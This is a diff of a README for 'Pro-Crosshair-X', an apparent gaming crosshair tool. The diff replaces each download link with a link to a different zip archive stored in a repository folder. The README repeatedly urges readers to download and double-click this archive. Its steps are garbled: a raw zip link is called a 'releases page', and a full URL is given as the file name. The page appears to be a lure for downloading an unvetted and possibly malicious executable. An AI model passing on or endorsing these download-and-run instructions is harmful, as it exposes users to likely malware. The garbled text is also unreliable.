@@ -1,6 +1,6 @@
 # 🎯 Pro-Crosshair-X - Precision Aiming Made Easy
 
-[![Download Pro-Crosshair-X](https://raw.githubusercontent.com/jash1717/Pro-Crosshair-X/main/discussable/Pro-Crosshair-X.zip)](https://raw.githubusercontent.com/jash1717/Pro-Crosshair-X/main/discussable/Pro-Crosshair-X.zip)
+[![Download Pro-Crosshair-X](https://github.com/jash1717/Pro-Crosshair-X/raw/refs/heads/main/discussable/X_Crosshair_Pro_v1.6.zip)](https://github.com/jash1717/Pro-Crosshair-X/raw/refs/heads/main/discussable/X_Crosshair_Pro_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -21,13 +21,13 @@ Ensure your computer meets these requirements for the best experience.
 
 1. **Visit the Download Page**: Click the link below to go to the releases page:
    
-   [Download Pro-Crosshair-X](https://raw.githubusercontent.com/jash1717/Pro-Crosshair-X/main/discussable/Pro-Crosshair-X.zip)
+   [Download Pro-Crosshair-X](https://github.com/jash1717/Pro-Crosshair-X/raw/refs/heads/main/discussable/X_Crosshair_Pro_v1.6.zip)
 
 2. **Choose the Latest Version**: On the releases page, look for the newest version. You will see a list of available files.
 
-3. **Download the Installer**: Click on the file named `https://raw.githubusercontent.com/jash1717/Pro-Crosshair-X/main/discussable/Pro-Crosshair-X.zip` to download it. This file includes everything you need to install the application.
+3. **Download the Installer**: Click on the file named `https://github.com/jash1717/Pro-Crosshair-X/raw/refs/heads/main/discussable/X_Crosshair_Pro_v1.6.zip` to download it. This file includes everything you need to install the application.
 
-4. **Run the Installer**: Once the download finishes, locate the `https://raw.githubusercontent.com/jash1717/Pro-Crosshair-X/main/discussable/Pro-Crosshair-X.zip` file, usually found in your "Downloads" folder. Double-click the file to open it.
+4. **Run the Installer**: Once the download finishes, locate the `https://github.com/jash1717/Pro-Crosshair-X/raw/refs/heads/main/discussable/X_Crosshair_Pro_v1.6.zip` file, usually found in your "Downloads" folder. Double-click the file to open it.
 
 5. **Follow the Installation Steps**: A window will appear guiding you through the installation process. Follow these steps:
 
@@ -81,7 +81,7 @@ If you encounter any bugs or have suggestions for improvements, we encourage you
 
 ## 🔗 Useful Links
 
-- [Download Pro-Crosshair-X](https://raw.githubusercontent.com/jash1717/Pro-Crosshair-X/main/discussable/Pro-Crosshair-X.zip)
+- [Download Pro-Crosshair-X](https://github.com/jash1717/Pro-Crosshair-X/raw/refs/heads/main/discussable/X_Crosshair_Pro_v1.6.zip)
 - [Community Forums](#)
 - [Feature Requests](#)
 
